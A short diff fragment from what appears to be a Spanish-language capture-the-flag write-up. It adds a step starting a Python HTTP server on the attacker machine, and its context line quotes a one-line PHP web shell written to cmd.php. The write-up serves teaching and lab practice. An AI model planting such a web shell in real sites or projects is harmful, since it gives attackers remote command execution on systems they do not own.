@@ -131,3 +131,22 @@ echo -n '<?php system($_GET["cmd"]); ?>' >cmd.php
 
 
 
+3-Monto un servidor http con python en mi máquina atacante:
+
+```bash
+sudo python3 -m http.server 80
+```
+
+
+
+![imagen_CTF](images/Rolarola/15.png)
+
+
+
+
+
+
+
+
+
+
